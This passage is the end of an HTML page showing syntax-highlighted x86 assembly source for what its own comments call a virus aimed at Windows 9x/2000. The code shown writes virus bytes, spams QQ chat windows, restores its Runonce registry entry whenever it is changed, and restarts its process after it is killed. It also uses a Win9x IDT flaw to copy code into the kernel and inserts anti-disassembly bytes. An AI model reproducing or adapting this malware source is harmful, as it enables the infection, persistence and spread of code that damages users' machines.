    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlLWrite</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">ContWriteVirusBytes</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">ContUnZipVirus</span><span class="sc0">
</span><span class="sc5">UnzipVirusEnd</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0e9h</span><span class="sc0">        </span><span class="sc1">;静态反汇编干扰</span><span class="sc0">

</span><span class="sc5">SendQQMsg</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc5">Param</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">BuildQQMsg</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0a0dh</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">stosw</span><span class="sc0">       
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushQQMsg</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> 
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">StoreQQMsg</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">StoreQQMsg</span><span class="sc0">    
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushQQWndText</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'发送消息'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushQQWndText</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFindWindowA</span><span class="sc0">
    </span><span class="sc5">FindWindowA9x2k</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">GetFindWindowA</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">WaitForQQWnd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetGetWindow</span><span class="sc0">
    </span><span class="sc5">GetWindow9x2k</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">GetGetWindow</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">GW_CHILD</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">WaitForQQWnd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetSendMessageA</span><span class="sc0">
    </span><span class="sc5">SendMessageA9x2k</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">GetSendMessageA</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">WM_GETTEXT</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">WaitForQQWnd</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">WM_SETTEXT</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">WaitForQQWnd</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">WaitForQQWnd</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetSleep</span><span class="sc0">
    </span><span class="sc5">Sleep9x2k</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">GetSleep</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">500</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">BuildQQMsg</span><span class="sc0">  
</span><span class="sc5">SendQQMsg</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0e9h</span><span class="sc0">        </span><span class="sc1">;静态反汇编干扰</span><span class="sc0">

</span><span class="sc5">RegisterProtectProc</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc5">hKey</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">hKey</span><span class="sc0">    </span><span class="sc1">;注册表保护过程，9x/2k实用  </span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetProtectKeyName</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Runonce'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">GetProtectKeyName</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">100h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetAdvRegQueryValueExA</span><span class="sc0">
    </span><span class="sc5">AdvRegQueryValueExA9x2k</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">GetAdvRegQueryValueExA</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;读出原始值保存在堆栈中</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">WaitRegChangeNotify</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetAdvRegNotifyChangeKeyValue</span><span class="sc0">
    </span><span class="sc5">AdvRegNotifyChangeKeyValue9x2k</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">GetAdvRegNotifyChangeKeyValue</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;等待注册表改变通知</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetAdvRegSetValueExA</span><span class="sc0">
    </span><span class="sc5">AdvRegSetValueExA9x2k</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">GetAdvRegSetValueExA</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;还原原始值</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">  
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">WaitRegChangeNotify</span><span class="sc0">   
</span><span class="sc5">RegisterProtectProc</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0e9h</span><span class="sc0">        </span><span class="sc1">;静态反汇编干扰</span><span class="sc0">

</span><span class="sc5">ProcessProtectProc</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc5">ProcID</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0">    
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetKnlOpenProcess</span><span class="sc0">
    </span><span class="sc5">KnlOpenProcess9x2k</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">GetKnlOpenProcess</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> 
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc5">PROCESS_ALL_ACCESS</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc5">ProcID</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;打开进程</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">ExitProtectProc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetKnlWaitForSingleObject</span><span class="sc0">
    </span><span class="sc5">KnlWaitForSingleObject9x2k</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">GetKnlWaitForSingleObject</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;等待进程结束</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,-</span><span class="sc2">1h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFileNameAddress</span><span class="sc0">
</span><span class="sc5">GetFileNameAddress</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FullPath</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetFileNameAddress</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetKnlWinExec</span><span class="sc0">
    </span><span class="sc5">KnlWinExec9x2k</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">GetKnlWinExec</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;重起病毒进程   </span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc0">
</span><span class="sc5">ExitProtectProc</span><span class="sc4">:</span><span class="sc0">    
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">ProcessProtectProc</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">ProcessProtectProcSize</span><span class="sc4">=</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ProcessProtectProc</span><span class="sc0">
</span><span class="sc5">FullPath</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0e9h</span><span class="sc0">

</span><span class="sc5">MoveDataToKnl</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc5">Src</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc4">,</span><span class="sc5">Des</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc4">,</span><span class="sc5">nCx</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">sidt</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc0">     </span><span class="sc1">;IDT03号</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SetIdt03</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">   
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">       </span><span class="sc1">;复制代码/数据到内核代码指定位置</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">iret</span><span class="sc0">    
</span><span class="sc5">SetIdt03</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cli</span><span class="sc0">    
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">Src</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">Des</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">nCx</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc1">;      ;利用Win9x,IDT漏洞进入系统内核</span><span class="sc0">
    </span><span class="sc6">sti</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">MoveDataToKnl</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0e9h</span><span class="sc0">        </span><span class="sc1">;静态反汇编干扰</span><span class="sc0">

</span><span class="sc5">DbgMsg</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc5">pMsg</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">pMsg</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.UserMessageBoxA</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">DbgMsg</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">VirusEnd</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;这里是变形解密代码</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc9">.code</span><span class="sc0"> 

</span><span class="sc5">Msg</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Virus has running ok'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Exit</span><span class="sc4">:</span><span class="sc0">   
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MessageBoxA</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Msg</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Msg</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ExitProcess</span><span class="sc4">,</span><span class="sc5">L</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
 
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">Start</span></div></body>
</html>
